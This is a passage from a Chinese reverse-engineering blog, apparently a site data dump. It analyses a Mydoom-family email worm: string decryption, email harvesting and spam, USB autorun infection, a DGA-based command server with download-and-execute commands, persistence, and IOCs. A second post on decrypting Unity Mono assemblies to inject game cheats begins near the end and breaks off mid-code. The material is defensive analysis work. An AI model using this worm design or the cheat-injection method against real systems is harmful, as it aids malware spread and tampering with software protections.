class=\"type\">char</span> a2)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    BYTE* v2; <span class=\"comment\">// ecx</span></span><br><span class=\"line\">    <span class=\"type\">int</span> v3; <span class=\"comment\">// ebx</span></span><br><span class=\"line\"></span><br><span class=\"line\">    v2 = a1;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (*a1)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ((<span class=\"type\">char</span>)*a1 == a2)</span><br><span class=\"line\">            <span class=\"keyword\">return</span> v2;</span><br><span class=\"line\">        <span class=\"keyword\">do</span></span><br><span class=\"line\">            ++v2;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (*v2 &amp;&amp; (<span class=\"type\">char</span>)*v2 != a2);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    v3 = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ((<span class=\"type\">char</span>)*v2 == a2)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> v2;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (BYTE*)v3;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> __cdecl <span class=\"title function_\">DecryptChar_404B16</span><span class=\"params\">(<span class=\"type\">char</span> a1)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    BYTE* v1; <span class=\"comment\">// eax</span></span><br><span class=\"line\">    <span class=\"type\">int</span> v2; <span class=\"comment\">// edx</span></span><br><span class=\"line\">    BYTE* v3; <span class=\"comment\">// eax</span></span><br><span class=\"line\">    BYTE v5[<span class=\"number\">32</span>] = <span class=\"string\">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span>; <span class=\"comment\">// [esp+18h] [ebp-48h] BYREF</span></span><br><span class=\"line\">    BYTE v6[<span class=\"number\">40</span>] = <span class=\"string\">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>; <span class=\"comment\">// [esp+38h] [ebp-28h] BYREF</span></span><br><span class=\"line\"></span><br><span class=\"line\">    v1 = sub_404AD6(v6, a1);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (v1)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> v6[(v1 - v6 + <span class=\"number\">13</span>) % <span class=\"number\">26</span>];</span><br><span class=\"line\">    v3 = sub_404AD6(v5, a1);</span><br><span class=\"line\">    v2 = a1;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (v3)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> v5[(v3 - v5 + <span class=\"number\">13</span>) % <span class=\"number\">26</span>];</span><br><span class=\"line\">    <span class=\"keyword\">return</span> v2;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> __cdecl <span class=\"title function_\">strcpy_404C38</span><span class=\"params\">(BYTE* a1, <span class=\"type\">char</span>* a2)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">char</span>* i; <span class=\"comment\">// ebx</span></span><br><span class=\"line\">    <span class=\"type\">char</span> v4; <span class=\"comment\">// [esp+0h] [ebp-Ch]</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (i = a2; *i; ++a1)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        v4 = *i++;</span><br><span class=\"line\">        *a1 = DecryptChar_404B16(v4); <span class=\"comment\">//解密</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    *a1 = <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>接着通过注册表<code>Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\vulnvol32\\Vers</code>是否存在来判断是否为首次运行样本。</p>\n<p><img src=\"/./Mydoom%E9%82%AE%E4%BB%B6%E4%BC%A0%E6%92%AD%E8%A0%95%E8%99%AB%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20221108105115626.png\" alt=\"image-20221108105115626\"></p>\n<p><img src=\"/./Mydoom%E9%82%AE%E4%BB%B6%E4%BC%A0%E6%92%AD%E8%A0%95%E8%99%AB%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20221108115655959.png\" alt=\"image-20221108115655959\"></p>\n<p>经过分析后可得知样本使用的注册表内容含义如下:</p>\n<table>\n<thead>\n<tr>\n<th>项名</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>iduser</td>\n<td>唯一标识ID</td>\n</tr>\n<tr>\n<td>usw</td>\n<td>自身认证</td>\n</tr>\n<tr>\n<td>pafw</td>\n<td>自身认证</td>\n</tr>\n<tr>\n<td>statem</td>\n<td>窃取传播邮件功能开关</td>\n</tr>\n<tr>\n<td>usbactiv</td>\n<td>感染可移动磁盘功能开关</td>\n</tr>\n<tr>\n<td>namecp</td>\n<td>感染可移动磁盘中autorun.inf执行的恶意模块名</td>\n</tr>\n</tbody></table>\n<p><img src=\"/./Mydoom%E9%82%AE%E4%BB%B6%E4%BC%A0%E6%92%AD%E8%A0%95%E8%99%AB%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20221108130527982.png\" alt=\"image-20221108130527982\"></p>\n<h3 id=\"2-1-初始化\"><a href=\"#2-1-初始化\" class=\"headerlink\" title=\"2.1 初始化\"></a>2.1 初始化</h3><p>创建了一个名为<code>VULnaShvolna</code>的互斥体，确保样本单例运行。</p>\n<p><img src=\"/./Mydoom%E9%82%AE%E4%BB%B6%E4%BC%A0%E6%92%AD%E8%A0%95%E8%99%AB%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20221108105527041.png\" alt=\"image-20221108105527041\"></p>\n<p>然后读取注册表中<code>Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\vulnvol32\\Vers</code>的<code>statem</code>项来判断当前是否有运行传播恶意邮件模块，没有则启动。</p>\n<p><img src=\"/./Mydoom%E9%82%AE%E4%BB%B6%E4%BC%A0%E6%92%AD%E8%A0%95%E8%99%AB%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20221108105736279.png\" alt=\"image-20221108105736279\"></p>\n<p>接着再创建一个名为<code>x_socks5aan</code>的互斥体，并读取<code>Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\vulnvol32\\Vers</code>的<code>usbactiv</code>判断是否有感染U盘模块运行，没有则启动。</p>\n<p><img src=\"/./Mydoom%E9%82%AE%E4%BB%B6%E4%BC%A0%E6%92%AD%E8%A0%95%E8%99%AB%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20221108115627027.png\" alt=\"image-20221108115627027\"></p>\n<p>然后执行函数<code>remote_407c4E</code>，进行与C2通讯执行rce。</p>\n<h4 id=\"2-1-1-收集邮箱并发送恶意邮件\"><a href=\"#2-1-1-收集邮箱并发送恶意邮件\" class=\"headerlink\" title=\"2.1.1 收集邮箱并发送恶意邮件\"></a>2.1.1 收集邮箱并发送恶意邮件</h4><p>首先将grcopy.dll(实际为Readme.exe)文件压缩为zipfi.dll文件和zipfiaq.dll文件，压缩文件名分别为readme.exe、foto.pif，用于后续邮件附件发送。</p>\n<p><img src=\"/./Mydoom%E9%82%AE%E4%BB%B6%E4%BC%A0%E6%92%AD%E8%A0%95%E8%99%AB%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20221108121336444.png\" alt=\"image-20221108121336444\"></p>\n<p>然后从C盘开始遍历磁盘。</p>\n<p><img src=\"/./Mydoom%E9%82%AE%E4%BB%B6%E4%BC%A0%E6%92%AD%E8%A0%95%E8%99%AB%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20221108120411393.png\" alt=\"image-20221108120411393\"></p>\n<p><img src=\"/./Mydoom%E9%82%AE%E4%BB%B6%E4%BC%A0%E6%92%AD%E8%A0%95%E8%99%AB%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20221108143148932.png\" alt=\"image-20221108143148932\"></p>\n<p><img src=\"/./Mydoom%E9%82%AE%E4%BB%B6%E4%BC%A0%E6%92%AD%E8%A0%95%E8%99%AB%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20221108120437883.png\" alt=\"image-20221108120437883\"></p>\n<p>并筛选文件后缀名为html、htm、php、doc、xml、txt、pl、tbb的文件。</p>\n<p><img src=\"/./Mydoom%E9%82%AE%E4%BB%B6%E4%BC%A0%E6%92%AD%E8%A0%95%E8%99%AB%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20221108120539969.png\" alt=\"image-20221108120539969\"></p>\n<p>然后搜索这些文件中是否存在邮箱格式的数据。</p>\n<p><img src=\"/./Mydoom%E9%82%AE%E4%BB%B6%E4%BC%A0%E6%92%AD%E8%A0%95%E8%99%AB%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20221108120618112.png\" alt=\"image-20221108120618112\"></p>\n<p>其中会过滤掉一下这些特殊邮箱格式。</p>\n<p><img src=\"/./Mydoom%E9%82%AE%E4%BB%B6%E4%BC%A0%E6%92%AD%E8%A0%95%E8%99%AB%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20221108121007084.png\" alt=\"image-20221108121007084\"></p>\n<p>获取到邮箱后，开始随机拼接邮件的主题、内容、附件和发件人。</p>\n<p><img src=\"/./Mydoom%E9%82%AE%E4%BB%B6%E4%BC%A0%E6%92%AD%E8%A0%95%E8%99%AB%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20221108120746829.png\" alt=\"image-20221108120746829\"></p>\n<p>随机的内容、主题、附件名、发件人如下：</p>\n<p><img src=\"/./Mydoom%E9%82%AE%E4%BB%B6%E4%BC%A0%E6%92%AD%E8%A0%95%E8%99%AB%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20221108120950223.png\" alt=\"image-20221108120950223\"></p>\n<p><img src=\"/./Mydoom%E9%82%AE%E4%BB%B6%E4%BC%A0%E6%92%AD%E8%A0%95%E8%99%AB%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20221108121025350.png\" alt=\"image-20221108121025350\"></p>\n<p><img src=\"/./Mydoom%E9%82%AE%E4%BB%B6%E4%BC%A0%E6%92%AD%E8%A0%95%E8%99%AB%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20221108120920022.png\" alt=\"image-20221108120920022\"></p>\n<p>最后连接SMTP服务器将样本压缩文件作为附件一同发送给目标邮箱。</p>\n<p><img src=\"/./Mydoom%E9%82%AE%E4%BB%B6%E4%BC%A0%E6%92%AD%E8%A0%95%E8%99%AB%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20221108121103348.png\" alt=\"image-20221108121103348\"></p>\n<p><img src=\"/./Mydoom%E9%82%AE%E4%BB%B6%E4%BC%A0%E6%92%AD%E8%A0%95%E8%99%AB%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20221108121109044.png\" alt=\"image-20221108121109044\"></p>\n<p>通过样本字符串在github上关联到部分实现代码：<a href=\"https://github.com/ChinesesBlueSky/learngit/blob/a22988db03194f043033e041884993f88c084fd4/wazuh/src/os_maild/sendmail.c\">https://github.com/ChinesesBlueSky/learngit/blob/a22988db03194f043033e041884993f88c084fd4/wazuh/src/os_maild/sendmail.c</a></p>\n<p><img src=\"/./Mydoom%E9%82%AE%E4%BB%B6%E4%BC%A0%E6%92%AD%E8%A0%95%E8%99%AB%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20221108121207928.png\" alt=\"image-20221108121207928\"></p>\n<p>由于C2失活，因此无法获取样本建立stmp连接时使用的账号密码。</p>\n<h4 id=\"2-1-2-感染可移动磁盘\"><a href=\"#2-1-2-感染可移动磁盘\" class=\"headerlink\" title=\"2.1.2 感染可移动磁盘\"></a>2.1.2 感染可移动磁盘</h4><p>将satornas.dll修改为autorun.inf后写入到可移动磁盘中。</p>\n<p><img src=\"/./Mydoom%E9%82%AE%E4%BB%B6%E4%BC%A0%E6%92%AD%E8%A0%95%E8%99%AB%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20221108121543379.png\" alt=\"image-20221108121543379\"></p>\n<p>satornas.dll的实际内容如下：</p>\n<p><img src=\"/./Mydoom%E9%82%AE%E4%BB%B6%E4%BC%A0%E6%92%AD%E8%A0%95%E8%99%AB%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20221108121720073.png\" alt=\"image-20221108121720073\"></p>\n<h4 id=\"2-1-3-远程命令执行\"><a href=\"#2-1-3-远程命令执行\" class=\"headerlink\" title=\"2.1.3 远程命令执行\"></a>2.1.3 远程命令执行</h4><p>首先将url和C2进行解密，用于后续访问。</p>\n<p><img src=\"/./Mydoom%E9%82%AE%E4%BB%B6%E4%BC%A0%E6%92%AD%E8%A0%95%E8%99%AB%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20221108121848675.png\" alt=\"image-20221108121848675\"></p>\n<p>C2的生成使用了DGA算法生成。DGA 域名生算法以当前时间为种子。</p>\n<p><img src=\"/./Mydoom%E9%82%AE%E4%BB%B6%E4%BC%A0%E6%92%AD%E8%A0%95%E8%99%AB%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20221108122021685.png\" alt=\"image-20221108122021685\"></p>\n<p><img src=\"/./Mydoom%E9%82%AE%E4%BB%B6%E4%BC%A0%E6%92%AD%E8%A0%95%E8%99%AB%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20221108141433891.png\" alt=\"image-20221108141433891\"></p>\n<p><img src=\"/./Mydoom%E9%82%AE%E4%BB%B6%E4%BC%A0%E6%92%AD%E8%A0%95%E8%99%AB%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20221108141405789.png\" alt=\"image-20221108141405789\"></p>\n<p>然后通过拼接解密出的c2+url进行get请求访问文件进行认证。</p>\n<p><img src=\"/./Mydoom%E9%82%AE%E4%BB%B6%E4%BC%A0%E6%92%AD%E8%A0%95%E8%99%AB%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20221108122813293.png\" alt=\"image-20221108122813293\"></p>\n<p><img src=\"/./Mydoom%E9%82%AE%E4%BB%B6%E4%BC%A0%E6%92%AD%E8%A0%95%E8%99%AB%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20221108122853440.png\" alt=\"image-20221108122853440\"></p>\n<p>返回的数据进行解密判断认证是否成功。</p>\n<p><img src=\"/./Mydoom%E9%82%AE%E4%BB%B6%E4%BC%A0%E6%92%AD%E8%A0%95%E8%99%AB%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20221108122909074.png\" alt=\"image-20221108122909074\"></p>\n<p>最后与C2进行建立通讯。</p>\n<p><img src=\"/./Mydoom%E9%82%AE%E4%BB%B6%E4%BC%A0%E6%92%AD%E8%A0%95%E8%99%AB%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20221108122238589.png\" alt=\"image-20221108122238589\"></p>\n<p>命令解析。</p>\n<p><img src=\"/./Mydoom%E9%82%AE%E4%BB%B6%E4%BC%A0%E6%92%AD%E8%A0%95%E8%99%AB%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20221108123042152.png\" alt=\"image-20221108123042152\"></p>\n<p>其中各项指令有如下含义：</p>\n<table>\n<thead>\n<tr>\n<th>指令</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>http</td>\n<td>GET请求向服务器发送数据</td>\n</tr>\n<tr>\n<td>spamon</td>\n<td>关闭发送邮件功能</td>\n</tr>\n<tr>\n<td>down_file</td>\n<td>下载文件</td>\n</tr>\n<tr>\n<td>pusk</td>\n<td>下载文件并执行</td>\n</tr>\n<tr>\n<td>restart</td>\n<td>重新启动样本文件</td>\n</tr>\n<tr>\n<td>socksa</td>\n<td>设置注册表的usw和pafw</td>\n</tr>\n<tr>\n<td>flash_on</td>\n<td>开启磁盘感染功能</td>\n</tr>\n<tr>\n<td>flash_off</td>\n<td>关闭磁盘感染功能</td>\n</tr>\n<tr>\n<td>icmp</td>\n<td>TCP协议向服务器发送数据</td>\n</tr>\n</tbody></table>\n<h3 id=\"2-2-非初始化部分\"><a href=\"#2-2-非初始化部分\" class=\"headerlink\" title=\"2.2 非初始化部分\"></a>2.2 非初始化部分</h3><p>当初始化完毕或并非首次执行时，首先将资源数据进行解密，解密后的数据实际上为PE文件，样本将恶意模块覆盖到系统原文件<code>ctfmon.exe</code>进行伪装，并将<code>use32.dll</code>的时间戳替换到新的<code>ctfmon.exe</code>中。</p>\n<p><img src=\"/./Mydoom%E9%82%AE%E4%BB%B6%E4%BC%A0%E6%92%AD%E8%A0%95%E8%99%AB%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20221108123820213.png\" alt=\"image-20221108123820213\"></p>\n<p><img src=\"/./Mydoom%E9%82%AE%E4%BB%B6%E4%BC%A0%E6%92%AD%E8%A0%95%E8%99%AB%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20221108124059545.png\" alt=\"image-20221108124059545\"></p>\n<p>同理，解密另一个资源数据解密后，以<code>shervans.dll</code>为名写入到System32目录下。</p>\n<p><img src=\"/./Mydoom%E9%82%AE%E4%BB%B6%E4%BC%A0%E6%92%AD%E8%A0%95%E8%99%AB%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20221108123952364.png\" alt=\"image-20221108123952364\"></p>\n<p>然后随机生成一个iduser,写入到注册表中。</p>\n<p><img src=\"/./Mydoom%E9%82%AE%E4%BB%B6%E4%BC%A0%E6%92%AD%E8%A0%95%E8%99%AB%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20221108124228654.png\" alt=\"image-20221108124228654\"></p>\n<p>并将自己伪装成<code>grcopy.dll</code>写入到System32目录下。</p>\n<p><img src=\"/./Mydoom%E9%82%AE%E4%BB%B6%E4%BC%A0%E6%92%AD%E8%A0%95%E8%99%AB%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20221108124253955.png\" alt=\"image-20221108124253955\"></p>\n<p>最后通过API<code>LoadLibrary</code>函数将shervans.dll加载，并执行ctfmon.exe。</p>\n<p><img src=\"/./Mydoom%E9%82%AE%E4%BB%B6%E4%BC%A0%E6%92%AD%E8%A0%95%E8%99%AB%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20221108124352302.png\" alt=\"image-20221108124352302\"></p>\n<h1 id=\"二、ctfmon模块分析\"><a href=\"#二、ctfmon模块分析\" class=\"headerlink\" title=\"二、ctfmon模块分析\"></a>二、ctfmon模块分析</h1><h2 id=\"1、样本标签-1\"><a href=\"#1、样本标签-1\" class=\"headerlink\" title=\"1、样本标签\"></a>1、样本标签</h2><table>\n<thead>\n<tr>\n<th>标签名</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>原始⽂件名</td>\n<td>ctfmon.exe</td>\n</tr>\n<tr>\n<td>MD5</td>\n<td>4C1F6CF4E7DA5C96D6279B02B349B9FD</td>\n</tr>\n<tr>\n<td>⽂件⼤⼩</td>\n<td>4.06 KB (4,160 字节)</td>\n</tr>\n<tr>\n<td>⽂件格式</td>\n<td>Win32 Exe</td>\n</tr>\n<tr>\n<td>时间戳</td>\n<td>1970-01-01 08:00:00</td>\n</tr>\n<tr>\n<td>加壳类型</td>\n<td>UPX</td>\n</tr>\n<tr>\n<td>编译语⾔</td>\n<td>C&#x2F;C++</td>\n</tr>\n<tr>\n<td>SHA1</td>\n<td>38E767685A76319D01E75C2DDFE9EC0A166BC706</td>\n</tr>\n<tr>\n<td>CRC32</td>\n<td>67CE3B69</td>\n</tr>\n</tbody></table>\n<h2 id=\"2、详细分析-1\"><a href=\"#2、详细分析-1\" class=\"headerlink\" title=\"2、详细分析\"></a>2、详细分析</h2><p>样本(4C1F6CF4E7DA5C96D6279B02B349B9FD)的作用为执行模块<code>smnss.exe</code>(实际上为样本原始文件)和加载<code>shervans.dll</code>。当执行smnss.exe失败，则加载<code>shervans.dll</code>。</p>\n<p><img src=\"/./Mydoom%E9%82%AE%E4%BB%B6%E4%BC%A0%E6%92%AD%E8%A0%95%E8%99%AB%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20221108124928779.png\" alt=\"image-20221108124928779\"></p>\n<h1 id=\"三、shervans模块分析\"><a href=\"#三、shervans模块分析\" class=\"headerlink\" title=\"三、shervans模块分析\"></a>三、shervans模块分析</h1><h2 id=\"1、样本标签-2\"><a href=\"#1、样本标签-2\" class=\"headerlink\" title=\"1、样本标签\"></a>1、样本标签</h2><table>\n<thead>\n<tr>\n<th>标签名</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>原始⽂件名</td>\n<td>shervans.exe</td>\n</tr>\n<tr>\n<td>MD5</td>\n<td>1C437748F7AB08B03BEB56CFA69016B5</td>\n</tr>\n<tr>\n<td>⽂件⼤⼩</td>\n<td>8.50 KB (8,704 字节)</td>\n</tr>\n<tr>\n<td>⽂件格式</td>\n<td>Win32 DLL</td>\n</tr>\n<tr>\n<td>时间戳</td>\n<td>2010-05-20 17:10:51</td>\n</tr>\n<tr>\n<td>加壳类型</td>\n<td>UPX</td>\n</tr>\n<tr>\n<td>编译语⾔</td>\n<td>C&#x2F;C++</td>\n</tr>\n<tr>\n<td>SHA1</td>\n<td>B420D23E3CF680021EEA8C4B14685306024EAEE3</td>\n</tr>\n<tr>\n<td>CRC32</td>\n<td>F627F616</td>\n</tr>\n</tbody></table>\n<h2 id=\"2、详细分析-2\"><a href=\"#2、详细分析-2\" class=\"headerlink\" title=\"2、详细分析\"></a>2、详细分析</h2><p>样本(1C437748F7AB08B03BEB56CFA69016B5)首先将grcopy.dll修改为smnss.exe</p>\n<p><img src=\"/./Mydoom%E9%82%AE%E4%BB%B6%E4%BC%A0%E6%92%AD%E8%A0%95%E8%99%AB%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20221108125408991.png\" alt=\"image-20221108125408991\"></p>\n<p>然后创建一个名为<code>x_socks5aan</code>的互斥体后，在C盘写入了文件<code>satornas.dll</code>，该文件实际上为一个<code>autorun.inf</code>文件。</p>\n<p><img src=\"/./Mydoom%E9%82%AE%E4%BB%B6%E4%BC%A0%E6%92%AD%E8%A0%95%E8%99%AB%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20221108125505024.png\" alt=\"image-20221108125505024\"></p>\n<p><img src=\"/./Mydoom%E9%82%AE%E4%BB%B6%E4%BC%A0%E6%92%AD%E8%A0%95%E8%99%AB%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20221108125514696.png\" alt=\"image-20221108125514696\"></p>\n<p>并将<code>grcopy.dll</code>复制到磁盘根目录，名称是注册表配置项中的<code>namecp</code>。</p>\n<p><img src=\"/./Mydoom%E9%82%AE%E4%BB%B6%E4%BC%A0%E6%92%AD%E8%A0%95%E8%99%AB%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20221108125730940.png\" alt=\"image-20221108125730940\"></p>\n<p>然后执行smnss.exe。</p>\n<p><img src=\"/./Mydoom%E9%82%AE%E4%BB%B6%E4%BC%A0%E6%92%AD%E8%A0%95%E8%99%AB%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20221108125653750.png\" alt=\"image-20221108125653750\"></p>\n<p>添加shervans.dll到注册表实现COM组件劫持、添加ctfmon.exe到注册表启动项。</p>\n<p><img src=\"/./Mydoom%E9%82%AE%E4%BB%B6%E4%BC%A0%E6%92%AD%E8%A0%95%E8%99%AB%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20221108125901981.png\" alt=\"image-20221108125901981\"></p>\n<p><img src=\"/./Mydoom%E9%82%AE%E4%BB%B6%E4%BC%A0%E6%92%AD%E8%A0%95%E8%99%AB%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20221108130320170.png\" alt=\"image-20221108130320170\"></p>\n<p>最后以本机为服务器，启动并监听端口3159，等待连接并执行接收到的指令</p>\n<p><img src=\"/./Mydoom%E9%82%AE%E4%BB%B6%E4%BC%A0%E6%92%AD%E8%A0%95%E8%99%AB%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20221108130206441.png\" alt=\"image-20221108130206441\"></p>\n<h1 id=\"四、IOC\"><a href=\"#四、IOC\" class=\"headerlink\" title=\"四、IOC\"></a>四、IOC</h1><h2 id=\"一、MD5\"><a href=\"#一、MD5\" class=\"headerlink\" title=\"一、MD5\"></a>一、MD5</h2><table>\n<thead>\n<tr>\n<th>文件名</th>\n<th>MD5</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>Readme.exe</td>\n<td>194B2F31CC40249C041A5581E6A12A5B</td>\n</tr>\n<tr>\n<td>ctfmon.exe</td>\n<td>4C1F6CF4E7DA5C96D6279B02B349B9FD</td>\n</tr>\n<tr>\n<td>shervans.dll</td>\n<td>1C437748F7AB08B03BEB56CFA69016B5</td>\n</tr>\n</tbody></table>\n<h2 id=\"二、HOST\"><a href=\"#二、HOST\" class=\"headerlink\" title=\"二、HOST\"></a>二、HOST</h2><table>\n<thead>\n<tr>\n<th>HOST</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>hxxp:&#x2F;&#x2F;qehspqnmrn.info</td>\n</tr>\n<tr>\n<td>hxxp:&#x2F;&#x2F;qehspqnmrn.info&#x2F;imgs&#x2F;krewa&#x2F;nqxa.php</td>\n</tr>\n<tr>\n<td>hxxp:&#x2F;&#x2F;qehspqnmrn.info&#x2F;imgs&#x2F;xvima&#x2F;mvid.php</td>\n</tr>\n<tr>\n<td>hxxp:&#x2F;&#x2F;qehspqnmrn.info&#x2F;imgs&#x2F;ckanp&#x2F;load.php</td>\n</tr>\n<tr>\n<td>hxxp:&#x2F;&#x2F;qehspqnmrn.info&#x2F;imgs&#x2F;necxa&#x2F;qnumz.php</td>\n</tr>\n</tbody></table>\n<h2 id=\"三、开源报告\"><a href=\"#三、开源报告\" class=\"headerlink\" title=\"三、开源报告\"></a>三、开源报告</h2><ul>\n<li>记一起通过邮件传播的恶意程序攻击(<a href=\"https://mp.weixin.qq.com/s/-hWrK_de-1cBQvocL81FRw\">https://mp.weixin.qq.com/s/-hWrK_de-1cBQvocL81FRw</a>)</li>\n</ul>\n","categories":["Virus"]},{"title":"VBHeader","url":"/2024/04/21/VBHeader/","content":"<p><img src=\"/../images/Reverse/VBHeader/Untitled.png\" alt=\"Untitled\"></p>\n","categories":["Reverse"]},{"title":"U3D逆向-Mono另类解密","url":"/2024/04/21/U3D%E9%80%86%E5%90%91-Mono%E5%8F%A6%E7%B1%BB%E8%A7%A3%E5%AF%86/","content":"<h1 id=\"U3D逆向-Mono另类解密\"><a href=\"#U3D逆向-Mono另类解密\" class=\"headerlink\" title=\"U3D逆向-Mono另类解密\"></a>U3D逆向-Mono另类解密</h1><ul>\n<li><a href=\"https://bbs.pediy.com/user-home-826671.htm\">PlaneJun</a> ・2021-5-26 17:24</li>\n<li>2021-06-04 14:11 登上看雪公众号头条</li>\n<li><a href=\"https://mp.weixin.qq.com/s/nXZ2qfD4Qmt65aq0_0F6ag\">https://mp.weixin.qq.com/s/nXZ2qfD4Qmt65aq0_0F6ag</a></li>\n</ul>\n<p><img src=\"/../images/GameHacker/U3D%E9%80%86%E5%90%91-Mono%E5%8F%A6%E7%B1%BB%E8%A7%A3%E5%AF%86/document_image_rId6.png\" alt=\"document_image_rId6\"></p>\n<p>很久不来看雪了，这段时间过得真的是一言难尽。许久的发呆后决定干点有意义的事，于是乎就顺手来写一篇技术文章，算是本年的打卡。</p>\n<p>如题所示，U3D的Mono解密，这个玩意我昨晚在我的技术群里貌似看到说U3D是要弃用了Mono这个机制，也不知道是真是假，趁着还没弃用，我也就来说说这个机制的一个另类解密。</p>\n<p>关于Mono这东西我就不啰嗦了，我就直接进入正题。众所周知，Mono的加密主要是针对 <strong>Assembly-CSharp.dll</strong>，此DLL包含了游戏的所有功能性函数，并且可以通过工具dnSpy.exe加载后进行查看。</p>\n<p><img src=\"/../images/GameHacker/U3D%E9%80%86%E5%90%91-Mono%E5%8F%A6%E7%B1%BB%E8%A7%A3%E5%AF%86/document_image_rId7.png\" alt=\"document_image_rId7\"></p>\n<p>此DLL公开等于说源码公开，可以通过C#工程引入该DLL自写一个GameObject注入到游戏里调用游戏自带函数实现作弊。</p>\n<p><img src=\"/../images/GameHacker/U3D%E9%80%86%E5%90%91-Mono%E5%8F%A6%E7%B1%BB%E8%A7%A3%E5%AF%86/document_image_rId8.png\" alt=\"document_image_rId8\"></p>\n<p><img src=\"/../images/GameHacker/U3D%E9%80%86%E5%90%91-Mono%E5%8F%A6%E7%B1%BB%E8%A7%A3%E5%AF%86/document_image_rId9.png\" alt=\"document_image_rId9\"></p>\n<p>大多的加密手段就是对这DLL进行二进制处理，也就是把文件字节给进行处理。对于这种加密的处理方式很简单，Mono.dll是U3D用来初始化并加载dll的一个模块，他里面有一个函数<code>mono_image_open_from_data_with_name</code>，这里放一下他的函数代码。</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">MonoImage *</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">mono_image_open_from_data_with_name</span> <span class=\"params\">(<span class=\"type\">char</span> *data, guint32 data_len, gboolean need_copy, MonoImageOpenStatus *status, gboolean refonly, <span class=\"type\">const</span> <span class=\"type\">char</span> *name)</span></span></span><br><span class=\"line\"><span 